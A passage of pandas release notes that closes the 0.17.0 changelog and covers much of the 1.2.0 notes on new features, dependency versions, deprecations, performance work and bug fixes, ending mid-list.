result (:issue:`10962`)\n- Bug in ``Index`` arithmetic may result in incorrect class (:issue:`10638`)\n- Bug in ``date_range`` results in empty if freq is negative annually, quarterly and monthly (:issue:`11018`)\n- Bug in ``DatetimeIndex`` cannot infer negative freq (:issue:`11018`)\n- Remove use of some deprecated numpy comparison operations, mainly in tests. (:issue:`10569`)\n- Bug in ``Index`` dtype may not applied properly (:issue:`11017`)\n- Bug in ``io.gbq`` when testing for minimum google api client version (:issue:`10652`)\n- Bug in ``DataFrame`` construction from nested ``dict`` with ``timedelta`` keys (:issue:`11129`)\n- Bug in ``.fillna`` against may raise ``TypeError`` when data contains datetime dtype (:issue:`7095`, :issue:`11153`)\n- Bug in ``.groupby`` when number of keys to group by is same as length of index (:issue:`11185`)\n- Bug in ``convert_objects`` where converted values might not be returned if all null and ``coerce`` (:issue:`9589`)\n- Bug in ``convert_objects`` where ``copy`` keyword was not respected (:issue:`9589`)\n\n\n.. _whatsnew_0.17.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.16.2..v0.17.0\n\n\n.. _whatsnew_120:\n\nWhat's new in 1.2.0 (December 26, 2020)\n---------------------------------------\n\nThese are the changes in pandas 1.2.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. warning::\n\n   The `xlwt <https://xlwt.readthedocs.io/en/latest/>`_ package for writing old-style ``.xls``\n   excel files is no longer maintained.\n   The `xlrd <https://xlrd.readthedocs.io/en/latest/>`_ package is now only for reading\n   old-style ``.xls`` files.\n\n   Previously, the default argument ``engine=None`` to :func:`~pandas.read_excel`\n   would result in using the ``xlrd`` engine in many cases, including new\n   Excel 2007+ (``.xlsx``) files.\n   If `openpyxl <https://openpyxl.readthedocs.io/en/stable/>`_  is installed,\n   many of these cases will now default to using the ``openpyxl`` engine.\n   See the :func:`read_excel` documentation for more details.\n\n   Thus, it is strongly encouraged to install ``openpyxl`` to read Excel 2007+\n   (``.xlsx``) files.\n   **Please do not report issues when using ``xlrd`` to read ``.xlsx`` files.**\n   This is no longer supported, switch to using ``openpyxl`` instead.\n\n   Attempting to use the ``xlwt`` engine will raise a ``FutureWarning``\n   unless the option :attr:`io.excel.xls.writer` is set to ``\"xlwt\"``.\n   While this option is now deprecated and will also raise a ``FutureWarning``,\n   it can be globally set and the warning suppressed. Users are recommended to\n   write ``.xlsx`` files using the ``openpyxl`` engine instead.\n\n.. ---------------------------------------------------------------------------\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_120.duplicate_labels:\n\nOptionally disallow duplicate labels\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`Series` and :class:`DataFrame` can now be created with ``allows_duplicate_labels=False`` flag to\ncontrol whether the index or columns can contain duplicate labels (:issue:`28394`). This can be used to\nprevent accidental introduction of duplicate labels, which can affect downstream operations.\n\nBy default, duplicates continue to be allowed.\n\n.. code-block:: ipython\n\n    In [1]: pd.Series([1, 2], index=['a', 'a'])\n    Out[1]:\n    a    1\n    a    2\n    Length: 2, dtype: int64\n\n    In [2]: pd.Series([1, 2], index=['a', 'a']).set_flags(allows_duplicate_labels=False)\n    ...\n    DuplicateLabelError: Index has duplicates.\n          positions\n    label\n    a        [0, 1]\n\npandas will propagate the ``allows_duplicate_labels`` property through many operations.\n\n.. code-block:: ipython\n\n    In [3]: a = (\n       ...:     pd.Series([1, 2], index=['a', 'b'])\n       ...:       .set_flags(allows_duplicate_labels=False)\n       ...: )\n\n    In [4]: a\n    Out[4]:\n    a    1\n    b    2\n    Length: 2, dtype: int64\n\n     An operation introducing duplicates\n    In [5]: a.reindex(['a', 'b', 'a'])\n    ...\n    DuplicateLabelError: Index has duplicates.\n          positions\n    label\n    a        [0, 2]\n\n    [1 rows x 1 columns]\n\n.. warning::\n\n   This is an experimental feature. Currently, many methods fail to\n   propagate the ``allows_duplicate_labels`` value. In future versions\n   it is expected that every method taking or returning one or more\n   DataFrame or Series objects will propagate ``allows_duplicate_labels``.\n\nSee :ref:`duplicates` for more.\n\nThe ``allows_duplicate_labels`` flag is stored in the new :attr:`DataFrame.flags`\nattribute. This stores global attributes that apply to the *pandas object*. This\ndiffers from :attr:`DataFrame.attrs`, which stores information that applies to\nthe dataset.\n\nPassing arguments to fsspec backends\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nMany read/write functions have acquired the ``storage_options`` optional argument,\nto pass a dictionary of parameters to the storage backend. This allows, for\nexample, for passing credentials to S3 and GCS storage. The details of what\nparameters can be passed to which backends can be found in the documentation\nof the individual storage backends (detailed from the fsspec docs for\n`builtin implementations`_ and linked to `external ones`_). See\nSection :ref:`io.remote`.\n\n:issue:`35655` added fsspec support (including ``storage_options``)\nfor reading excel files.\n\n.. _builtin implementations: https://filesystem-spec.readthedocs.io/en/latest/api.html#built-in-implementations\n.. _external ones: https://filesystem-spec.readthedocs.io/en/latest/api.html#other-known-implementations\n\n.. _whatsnew_120.binary_handle_to_csv:\n\nSupport for binary file handles in ``to_csv``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`to_csv` supports file handles in binary mode (:issue:`19827` and :issue:`35058`)\nwith ``encoding`` (:issue:`13068` and :issue:`23854`) and ``compression`` (:issue:`22555`).\nIf pandas does not automatically detect whether the file handle is opened in binary or text mode,\nit is necessary to provide ``mode=\"wb\"``.\n\nFor example:\n\n.. ipython:: python\n\n   import io\n\n   data = pd.DataFrame([0, 1, 2])\n   buffer = io.BytesIO()\n   data.to_csv(buffer, encoding=\"utf-8\", compression=\"gzip\")\n\nSupport for short caption and table position in ``to_latex``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`DataFrame.to_latex` now allows one to specify\na floating table position (:issue:`35281`)\nand a short caption (:issue:`36267`).\n\nThe keyword ``position`` has been added to set the position.\n\n.. ipython:: python\n   :okwarning:\n\n   data = pd.DataFrame({'a': [1, 2], 'b': [3, 4]})\n   table = data.to_latex(position='ht')\n   print(table)\n\nUsage of the keyword ``caption`` has been extended.\nBesides taking a single string as an argument,\none can optionally provide a tuple ``(full_caption, short_caption)``\nto add a short caption macro.\n\n.. ipython:: python\n   :okwarning:\n\n   data = pd.DataFrame({'a': [1, 2], 'b': [3, 4]})\n   table = data.to_latex(caption=('the full long caption', 'short caption'))\n   print(table)\n\n.. _whatsnew_120.read_csv_table_precision_default:\n\nChange in default floating precision for ``read_csv`` and ``read_table``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nFor the C parsing engine, the methods :meth:`read_csv` and :meth:`read_table` previously defaulted to a parser that\ncould read floating point numbers slightly incorrectly with respect to the last bit in precision.\nThe option ``floating_precision=\"high\"`` has always been available to avoid this issue.\nBeginning with this version, the default is now to use the more accurate parser by making\n``floating_precision=None`` correspond to the high precision parser, and the new option\n``floating_precision=\"legacy\"`` to use the legacy parser. The change to using the higher precision\nparser by default should have no impact on performance. (:issue:`17154`)\n\n.. _whatsnew_120.floating:\n\nExperimental nullable data types for float data\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe've added :class:`Float32Dtype` / :class:`Float64Dtype` and :class:`~arrays.FloatingArray`.\nThese are extension data types dedicated to floating point data that can hold the\n``pd.NA`` missing value indicator (:issue:`32265`, :issue:`34307`).\n\nWhile the default float data type already supports missing values using ``np.nan``,\nthese new data types use ``pd.NA`` (and its corresponding behavior) as the missing\nvalue indicator, in line with the already existing nullable :ref:`integer <integer_na>`\nand :ref:`boolean <boolean>` data types.\n\nOne example where the behavior of ``np.nan`` and ``pd.NA`` is different is\ncomparison operations:\n\n.. ipython:: python\n\n   the default NumPy float64 dtype\n  s1 = pd.Series([1.5, None])\n  s1\n  s1 > 1\n\n.. ipython:: python\n\n   the new nullable float64 dtype\n  s2 = pd.Series([1.5, None], dtype=\"Float64\")\n  s2\n  s2 > 1\n\nSee the :ref:`missing_data.NA` doc section for more details on the behavior\nwhen using the ``pd.NA`` missing value indicator.\n\nAs shown above, the dtype can be specified using the \"Float64\" or \"Float32\"\nstring (capitalized to distinguish it from the default \"float64\" data type).\nAlternatively, you can also use the dtype object:\n\n.. ipython:: python\n\n   pd.Series([1.5, None], dtype=pd.Float32Dtype())\n\nOperations with the existing integer or boolean nullable data types that\ngive float results will now also use the nullable floating data types (:issue:`38178`).\n\n.. warning::\n\n   Experimental: the new floating data types are currently experimental, and their\n   behavior or API may still change without warning. Especially the behavior\n   regarding NaN (distinct from NA missing values) is subject to change.\n\n.. _whatsnew_120.index_name_preservation:\n\nIndex/column name preservation when aggregating\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWhen aggregating using :meth:`concat` or the :class:`DataFrame` constructor, pandas\nwill now attempt to preserve index and column names whenever possible (:issue:`35847`).\nIn the case where all inputs share a common name, this name will be assigned to the\nresult. When the input names do not all agree, the result will be unnamed. Here is an\nexample where the index name is preserved:\n\n.. ipython:: python\n\n    idx = pd.Index(range(5), name='abc')\n    ser = pd.Series(range(5, 10), index=idx)\n    pd.concat({'x': ser[1:], 'y': ser[:-1]}, axis=1)\n\nThe same is true for :class:`MultiIndex`, but the logic is applied separately on a\nlevel-by-level basis.\n\n.. _whatsnew_120.groupby_ewm:\n\nGroupBy supports EWM operations directly\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`.DataFrameGroupBy` now supports exponentially weighted window operations directly (:issue:`16037`).\n\n.. ipython:: python\n\n    df = pd.DataFrame({'A': ['a', 'b', 'a', 'b'], 'B': range(4)})\n    df\n    df.groupby('A').ewm(com=1.0).mean()\n\nAdditionally ``mean`` supports execution via `Numba <https://numba.pydata.org/>`__ with\nthe  ``engine`` and ``engine_kwargs`` arguments. Numba must be installed as an optional dependency\nto use this feature.\n\n.. _whatsnew_120.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n- Added ``day_of_week`` (compatibility alias ``dayofweek``) property to :class:`Timestamp`, :class:`.DatetimeIndex`, :class:`Period`, :class:`PeriodIndex` (:issue:`9605`)\n- Added ``day_of_year`` (compatibility alias ``dayofyear``) property to :class:`Timestamp`, :class:`.DatetimeIndex`, :class:`Period`, :class:`PeriodIndex` (:issue:`9605`)\n- Added :meth:`~DataFrame.set_flags` for setting table-wide flags on a Series or DataFrame (:issue:`28394`)\n- :meth:`DataFrame.applymap` now supports ``na_action`` (:issue:`23803`)\n- :class:`Index` with object dtype supports division and multiplication (:issue:`34160`)\n- :meth:`io.sql.get_schema` now supports a ``schema`` keyword argument that will add a schema into the create table statement (:issue:`28486`)\n- :meth:`DataFrame.explode` and :meth:`Series.explode` now support exploding of sets (:issue:`35614`)\n- :meth:`DataFrame.hist` now supports time series (datetime) data (:issue:`32590`)\n- :meth:`.Styler.set_table_styles` now allows the direct styling of rows and columns and can be chained (:issue:`35607`)\n- :class:`.Styler` now allows direct CSS class name addition to individual data cells (:issue:`36159`)\n- :meth:`.Rolling.mean` and :meth:`.Rolling.sum` use Kahan summation to calculate the mean to avoid numerical problems (:issue:`10319`, :issue:`11645`, :issue:`13254`, :issue:`32761`, :issue:`36031`)\n- :meth:`.DatetimeIndex.searchsorted`, :meth:`.TimedeltaIndex.searchsorted`, :meth:`PeriodIndex.searchsorted`, and :meth:`Series.searchsorted` with datetime-like dtypes will now try to cast string arguments (list-like and scalar) to the matching datetime-like type (:issue:`36346`)\n- Added methods :meth:`IntegerArray.prod`, :meth:`IntegerArray.min`, and :meth:`IntegerArray.max` (:issue:`33790`)\n- Calling a NumPy ufunc on a ``DataFrame`` with extension types now preserves the extension types when possible (:issue:`23743`)\n- Calling a binary-input NumPy ufunc on multiple ``DataFrame`` objects now aligns, matching the behavior of binary operations and ufuncs on ``Series`` (:issue:`23743`).\n  This change has been reverted in pandas 1.2.1, and the behaviour to not align DataFrames\n  is deprecated instead, see the :ref:`the 1.2.1 release notes <whatsnew_121.ufunc_deprecation>`.\n- Where possible :meth:`RangeIndex.difference` and :meth:`RangeIndex.symmetric_difference` will return :class:`RangeIndex` instead of :class:`Int64Index` (:issue:`36564`)\n- :meth:`DataFrame.to_parquet` now supports :class:`MultiIndex` for columns in parquet format (:issue:`34777`)\n- :func:`read_parquet` gained a ``use_nullable_dtypes=True`` option to use nullable dtypes that use ``pd.NA`` as missing value indicator where possible for the resulting DataFrame (default is ``False``, and only applicable for ``engine=\"pyarrow\"``) (:issue:`31242`)\n- Added :meth:`.Rolling.sem` and :meth:`Expanding.sem` to compute the standard error of the mean (:issue:`26476`)\n- :meth:`.Rolling.var` and :meth:`.Rolling.std` use Kahan summation and Welford's Method to avoid numerical issues (:issue:`37051`)\n- :meth:`DataFrame.corr` and :meth:`DataFrame.cov` use Welford's Method to avoid numerical issues (:issue:`37448`)\n- :meth:`DataFrame.plot` now recognizes ``xlabel`` and ``ylabel`` arguments for plots of type ``scatter`` and ``hexbin`` (:issue:`37001`)\n- :class:`DataFrame` now supports the ``divmod`` operation (:issue:`37165`)\n- :meth:`DataFrame.to_parquet` now returns a ``bytes`` object when no ``path`` argument is passed (:issue:`37105`)\n- :class:`.Rolling` now supports the ``closed`` argument for fixed windows (:issue:`34315`)\n- :class:`.DatetimeIndex` and :class:`Series` with ``datetime64`` or ``datetime64tz`` dtypes now support ``std`` (:issue:`37436`)\n- :class:`Window` now supports all Scipy window types in ``win_type`` with flexible keyword argument support (:issue:`34556`)\n- :meth:`testing.assert_index_equal` now has a ``check_order`` parameter that allows indexes to be checked in an order-insensitive manner (:issue:`37478`)\n- :func:`read_csv` supports memory-mapping for compressed files (:issue:`37621`)\n- Add support for ``min_count`` keyword for :meth:`DataFrame.groupby` and :meth:`DataFrame.resample` for functions ``min``, ``max``, ``first`` and ``last`` (:issue:`37821`, :issue:`37768`)\n- Improve error reporting for :meth:`DataFrame.merge` when invalid merge column definitions were given (:issue:`16228`)\n- Improve numerical stability for :meth:`.Rolling.skew`, :meth:`.Rolling.kurt`, :meth:`Expanding.skew` and :meth:`Expanding.kurt` through implementation of Kahan summation (:issue:`6929`)\n- Improved error reporting for subsetting columns of a :class:`.DataFrameGroupBy` with ``axis=1`` (:issue:`37725`)\n- Implement method ``cross`` for :meth:`DataFrame.merge` and :meth:`DataFrame.join` (:issue:`5401`)\n- When :func:`read_csv`, :func:`read_sas` and :func:`read_json` are called with ``chunksize``/``iterator`` they can be used in a ``with`` statement as they return context-managers (:issue:`38225`)\n- Augmented the list of named colors available for styling Excel exports, enabling all of CSS4 colors (:issue:`38247`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_120.notable_bug_fixes:\n\nNotable bug fixes\n~~~~~~~~~~~~~~~~~\n\nThese are bug fixes that might have notable behavior changes.\n\nConsistency of DataFrame Reductions\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n:meth:`DataFrame.any` and :meth:`DataFrame.all` with ``bool_only=True`` now\ndetermines whether to exclude object-dtype columns on a column-by-column basis,\ninstead of checking if *all* object-dtype columns can be considered boolean.\n\nThis prevents pathological behavior where applying the reduction on a subset\nof columns could result in a larger Series result. See (:issue:`37799`).\n\n.. ipython:: python\n\n    df = pd.DataFrame({\"A\": [\"foo\", \"bar\"], \"B\": [True, False]}, dtype=object)\n    df[\"C\"] = pd.Series([True, True])\n\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [5]: df.all(bool_only=True)\n    Out[5]:\n    C    True\n    dtype: bool\n\n    In [6]: df[[\"B\", \"C\"]].all(bool_only=True)\n    Out[6]:\n    B    False\n    C    True\n    dtype: bool\n\n*New behavior*:\n\n.. ipython:: python\n   :okwarning:\n\n    In [5]: df.all(bool_only=True)\n\n    In [6]: df[[\"B\", \"C\"]].all(bool_only=True)\n\n\nOther DataFrame reductions with ``numeric_only=None`` will also avoid\nthis pathological behavior (:issue:`37827`):\n\n.. ipython:: python\n\n    df = pd.DataFrame({\"A\": [0, 1, 2], \"B\": [\"a\", \"b\", \"c\"]}, dtype=object)\n\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [3]: df.mean()\n    Out[3]: Series([], dtype: float64)\n\n    In [4]: df[[\"A\"]].mean()\n    Out[4]:\n    A    1.0\n    dtype: float64\n\n*New behavior*:\n\n.. code-block:: ipython\n\n    In [3]: df.mean()\n    Out[3]:\n    A    1.0\n    dtype: float64\n\n    In [4]: df[[\"A\"]].mean()\n    Out[4]:\n    A    1.0\n    dtype: float64\n\nMoreover, DataFrame reductions with ``numeric_only=None`` will now be\nconsistent with their Series counterparts.  In particular, for\nreductions where the Series method raises ``TypeError``, the\nDataFrame reduction will now consider that column non-numeric\ninstead of casting to a NumPy array which may have different semantics (:issue:`36076`,\n:issue:`28949`, :issue:`21020`).\n\n.. ipython:: python\n   :okwarning:\n\n    ser = pd.Series([0, 1], dtype=\"category\", name=\"A\")\n    df = ser.to_frame()\n\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [5]: df.any()\n    Out[5]:\n    A    True\n    dtype: bool\n\n*New behavior*:\n\n.. code-block:: ipython\n\n    In [5]: df.any()\n    Out[5]: Series([], dtype: bool)\n\n\n.. _whatsnew_120.api_breaking.python:\n\nIncreased minimum version for Python\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\npandas 1.2.0 supports Python 3.7.1 and higher (:issue:`35214`).\n\n.. _whatsnew_120.api_breaking.deps:\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nSome minimum supported versions of dependencies were updated (:issue:`35214`).\nIf installed, we now require:\n\n+-----------------+-----------------+----------+---------+\n| Package         | Minimum Version | Required | Changed |\n+=================+=================+==========+=========+\n| numpy           | 1.16.5          |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| pytz            | 2017.3          |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| python-dateutil | 2.7.3           |    X     |         |\n+-----------------+-----------------+----------+---------+\n| bottleneck      | 1.2.1           |          |         |\n+-----------------+-----------------+----------+---------+\n| numexpr         | 2.6.8           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| pytest (dev)    | 5.0.1           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| mypy (dev)      | 0.782           |          |    X    |\n+-----------------+-----------------+----------+---------+\n\nFor `optional libraries <https://pandas.pydata.org/docs/getting_started/install.html>`_ the general recommendation is to use the latest version.\nThe following table lists the lowest version per library that is currently being tested throughout the development of pandas.\nOptional libraries below the lowest tested version may still work, but are not considered supported.\n\n+-----------------+-----------------+---------+\n| Package         | Minimum Version | Changed |\n+=================+=================+=========+\n| beautifulsoup4  | 4.6.0           |         |\n+-----------------+-----------------+---------+\n| fastparquet     | 0.3.2           |         |\n+-----------------+-----------------+---------+\n| fsspec          | 0.7.4           |         |\n+-----------------+-----------------+---------+\n| gcsfs           | 0.6.0           |         |\n+-----------------+-----------------+---------+\n| lxml            | 4.3.0           |    X    |\n+-----------------+-----------------+---------+\n| matplotlib      | 2.2.3           |    X    |\n+-----------------+-----------------+---------+\n| numba           | 0.46.0          |         |\n+-----------------+-----------------+---------+\n| openpyxl        | 2.6.0           |    X    |\n+-----------------+-----------------+---------+\n| pyarrow         | 0.15.0          |    X    |\n+-----------------+-----------------+---------+\n| pymysql         | 0.7.11          |    X    |\n+-----------------+-----------------+---------+\n| pytables        | 3.5.1           |    X    |\n+-----------------+-----------------+---------+\n| s3fs            | 0.4.0           |         |\n+-----------------+-----------------+---------+\n| scipy           | 1.2.0           |         |\n+-----------------+-----------------+---------+\n| sqlalchemy      | 1.2.8           |    X    |\n+-----------------+-----------------+---------+\n| xarray          | 0.12.3          |    X    |\n+-----------------+-----------------+---------+\n| xlrd            | 1.2.0           |    X    |\n+-----------------+-----------------+---------+\n| xlsxwriter      | 1.0.2           |    X    |\n+-----------------+-----------------+---------+\n| xlwt            | 1.3.0           |    X    |\n+-----------------+-----------------+---------+\n| pandas-gbq      | 0.12.0          |         |\n+-----------------+-----------------+---------+\n\nSee :ref:`install.dependencies` and :ref:`install.optional_dependencies` for more.\n\n.. _whatsnew_120.api.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n\n- Sorting in descending order is now stable for :meth:`Series.sort_values` and :meth:`Index.sort_values` for Datetime-like :class:`Index` subclasses. This will affect sort order when sorting a DataFrame on multiple columns, sorting with a key function that produces duplicates, or requesting the sorting index when using :meth:`Index.sort_values`. When using :meth:`Series.value_counts`, the count of missing values is no longer necessarily last in the list of duplicate counts. Instead, its position corresponds to the position in the original Series. When using :meth:`Index.sort_values` for Datetime-like :class:`Index` subclasses, NaTs ignored the ``na_position`` argument and were sorted to the beginning. Now they respect ``na_position``, the default being ``last``, same as other :class:`Index` subclasses (:issue:`35992`)\n- Passing an invalid ``fill_value`` to :meth:`Categorical.take`, :meth:`.DatetimeArray.take`, :meth:`TimedeltaArray.take`, or :meth:`PeriodArray.take` now raises a ``TypeError`` instead of a ``ValueError`` (:issue:`37733`)\n- Passing an invalid ``fill_value`` to :meth:`Series.shift` with a ``CategoricalDtype`` now raises a ``TypeError`` instead of a ``ValueError`` (:issue:`37733`)\n- Passing an invalid value to :meth:`IntervalIndex.insert` or :meth:`CategoricalIndex.insert` now raises a ``TypeError`` instead of a ``ValueError`` (:issue:`37733`)\n- Attempting to reindex a Series with a :class:`CategoricalIndex` with an invalid ``fill_value`` now raises a ``TypeError`` instead of a ``ValueError`` (:issue:`37733`)\n- :meth:`CategoricalIndex.append` with an index that contains non-category values will now cast instead of raising ``TypeError`` (:issue:`38098`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_120.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n- Deprecated parameter ``inplace`` in :meth:`MultiIndex.set_codes` and :meth:`MultiIndex.set_levels` (:issue:`35626`)\n- Deprecated parameter ``dtype`` of method :meth:`~Index.copy` for all :class:`Index` subclasses. Use the :meth:`~Index.astype` method instead for changing dtype (:issue:`35853`)\n- Deprecated parameters ``levels`` and ``codes`` in :meth:`MultiIndex.copy`. Use the :meth:`~MultiIndex.set_levels` and :meth:`~MultiIndex.set_codes` methods instead (:issue:`36685`)\n- Date parser functions :func:`~pandas.io.date_converters.parse_date_time`, :func:`~pandas.io.date_converters.parse_date_fields`, :func:`~pandas.io.date_converters.parse_all_fields` and :func:`~pandas.io.date_converters.generic_parser` from ``pandas.io.date_converters`` are deprecated and will be removed in a future version; use :func:`to_datetime` instead (:issue:`35741`)\n- :meth:`DataFrame.lookup` is deprecated and will be removed in a future version, use :meth:`DataFrame.melt` and :meth:`DataFrame.loc` instead (:issue:`35224`)\n- The method :meth:`Index.to_native_types` is deprecated. Use ``.astype(str)`` instead (:issue:`28867`)\n- Deprecated indexing :class:`DataFrame` rows with a single datetime-like string as ``df[string]`` (given the ambiguity whether it is indexing the rows or selecting a column), use ``df.loc[string]`` instead (:issue:`36179`)\n- Deprecated :meth:`Index.is_all_dates` (:issue:`27744`)\n- The default value of ``regex`` for :meth:`Series.str.replace` will change from ``True`` to ``False`` in a future release. In addition, single character regular expressions will *not* be treated as literal strings when ``regex=True`` is set (:issue:`24804`)\n- Deprecated automatic alignment on comparison operations between :class:`DataFrame` and :class:`Series`, do ``frame, ser = frame.align(ser, axis=1, copy=False)`` before e.g. ``frame == ser`` (:issue:`28759`)\n- :meth:`Rolling.count` with ``min_periods=None`` will default to the size of the window in a future version (:issue:`31302`)\n- Using \"outer\" ufuncs on DataFrames to return 4d ndarray is now deprecated. Convert to an ndarray first (:issue:`23743`)\n- Deprecated slice-indexing on tz-aware :class:`DatetimeIndex` with naive ``datetime`` objects, to match scalar indexing behavior (:issue:`36148`)\n- :meth:`Index.ravel` returning a ``np.ndarray`` is deprecated, in the future this will return a view on the same index (:issue:`19956`)\n- Deprecate use of strings denoting units with 'M', 'Y' or 'y' in :func:`~pandas.to_timedelta` (:issue:`36666`)\n- :class:`Index` methods ``&``, ``|``, and ``^`` behaving as the set operations :meth:`Index.intersection`, :meth:`Index.union`, and :meth:`Index.symmetric_difference`, respectively, are deprecated and in the future will behave as pointwise boolean operations matching :class:`Series` behavior.  Use the named set methods instead (:issue:`36758`)\n- :meth:`Categorical.is_dtype_equal` and :meth:`CategoricalIndex.is_dtype_equal` are deprecated, will be removed in a future version (:issue:`37545`)\n- :meth:`Series.slice_shift` and :meth:`DataFrame.slice_shift` are deprecated, use :meth:`Series.shift` or :meth:`DataFrame.shift` instead (:issue:`37601`)\n- Partial slicing on unordered :class:`.DatetimeIndex` objects with keys that are not in the index is deprecated and will be removed in a future version (:issue:`18531`)\n- The ``how`` keyword in :meth:`PeriodIndex.astype` is deprecated and will be removed in a future version, use ``index.to_timestamp(how=how)`` instead (:issue:`37982`)\n- Deprecated :meth:`Index.asi8` for :class:`Index` subclasses other than :class:`.DatetimeIndex`, :class:`.TimedeltaIndex`, and :class:`PeriodIndex` (:issue:`37877`)\n- The ``inplace`` parameter of :meth:`Categorical.remove_unused_categories` is deprecated and will be removed in a future version (:issue:`37643`)\n- The ``null_counts`` parameter of :meth:`DataFrame.info` is deprecated and replaced by ``show_counts``. It will be removed in a future version (:issue:`37999`)\n\n**Calling NumPy ufuncs on non-aligned DataFrames**\n\nCalling NumPy ufuncs on non-aligned DataFrames changed behaviour in pandas\n1.2.0 (to align the inputs before calling the ufunc), but this change is\nreverted in pandas 1.2.1. The behaviour to not align is now deprecated instead,\nsee the :ref:`the 1.2.1 release notes <whatsnew_121.ufunc_deprecation>` for\nmore details.\n\n.. ---------------------------------------------------------------------------\n\n\n.. _whatsnew_120.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Performance improvements when creating DataFrame or Series with dtype ``str`` or :class:`StringDtype` from array with many string elements (:issue:`36304`, :issue:`36317`, :issue:`36325`, :issue:`36432`, :issue:`37371`)\n- Performance improvement in :meth:`.DataFrameGroupBy.agg` and :meth:`.SeriesGroupBy.agg` with the ``numba`` engine (:issue:`35759`)\n- Performance improvements when creating :meth:`Series.map` from a huge dictionary (:issue:`34717`)\n- Performance improvement in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` with the ``numba`` engine (:issue:`36240`)\n- :class:`.Styler` uuid method altered to compress data transmission over web whilst maintaining reasonably low table collision probability (:issue:`36345`)\n- Performance improvement in :func:`to_datetime` with non-ns time unit for ``float`` ``dtype`` columns (:issue:`20445`)\n- Performance improvement in setting values on an :class:`IntervalArray` (:issue:`36310`)\n- The internal index method :meth:`~Index._shallow_copy` now makes the new index and original index share cached attributes, avoiding creating these again, if created on either. This can speed up operations that depend on creating copies of existing indexes (:issue:`36840`)\n- Performance improvement in :meth:`.RollingGroupby.count` (:issue:`35625`)\n- Small performance decrease to :meth:`.Rolling.min` and :meth:`.Rolling.max` for fixed windows (:issue:`36567`)\n- Reduced peak memory usage in :meth:`DataFrame.to_pickle` when using ``protocol=5`` in python 3.8+ (:issue:`34244`)\n- Faster ``dir`` calls when the object has many index labels, e.g. ``dir(ser)`` (:issue:`37450`)\n- Performance improvement in :class:`ExpandingGroupby` (:issue:`37064`)\n- Performance improvement in :meth:`Series.astype` and :meth:`DataFrame.astype` for :class:`Categorical` (:issue:`8628`)\n- Performance improvement in :meth:`DataFrame.groupby` for ``float`` ``dtype`` (:issue:`28303`), changes of the underlying hash-function can lead to changes in float based indexes sort ordering for ties (e.g. :meth:`Index.value_counts`)\n- Performance improvement in :meth:`pd.isin` for inputs with more than 1e6 elements (:issue:`36611`)\n- Performance improvement for :meth:`DataFrame.__setitem__` with list-like indexers (:issue:`37954`)\n- :meth:`read_json` now avoids reading entire file into memory when chunksize is specified (:issue:`34548`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_120.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nCategorical\n^^^^^^^^^^^\n- :meth:`Categorical.fillna` will always return a copy, validate a passed fill value regardless of whether there are any NAs to fill, and disallow an ``NaT`` as a fill value for numeric categories (:issue:`36530`)\n- Bug in :meth:`Categorical.__setitem__` that incorrectly raised when trying to set a tuple value (:issue:`20439`)\n- Bug in :meth:`CategoricalIndex.equals` incorrectly casting non-category entries to ``np.nan`` (:issue:`37667`)\n- Bug in :meth:`CategoricalIndex.where` incorrectly setting non-category entries to ``np.nan`` instead of raising ``TypeError`` (:issue:`37977`)\n- Bug in :meth:`Categorical.to_numpy` and ``np.array(categorical)`` with tz-aware ``datetime64`` categories incorrectly dropping the time zone information instead of casting to object dtype (:issue:`38136`)\n\nDatetime-like\n^^^^^^^^^^^^^\n- Bug in :meth:`DataFrame.combine_first` that would convert datetime-like column on other :class:`DataFrame` to integer when the column is not present in original :class:`DataFrame` (:issue:`28481`)\n- Bug in :attr:`.DatetimeArray.date` where a ``ValueError`` would be raised with a read-only backing array (:issue:`33530`)\n- Bug in ``NaT`` comparisons failing to raise ``TypeError`` on invalid inequality comparisons (:issue:`35046`)\n- Bug in :class:`.DateOffset` where attributes reconstructed from pickle files differ from original objects when input values exceed normal ranges (e.g. months=12) (:issue:`34511`)\n- Bug in :meth:`.DatetimeIndex.get_slice_bound` where ``datetime.date`` objects were not accepted or naive :class:`Timestamp` with a tz-aware :class:`.DatetimeIndex` (:issue:`35690`)\n- Bug in :meth:`.DatetimeIndex.slice_locs` where ``datetime.date`` objects were not accepted (:issue:`34077`)\n- Bug in :meth:`.DatetimeIndex.searchsorted`, :meth:`.TimedeltaIndex.searchsorted`, :meth:`PeriodIndex.searchsorted`, and 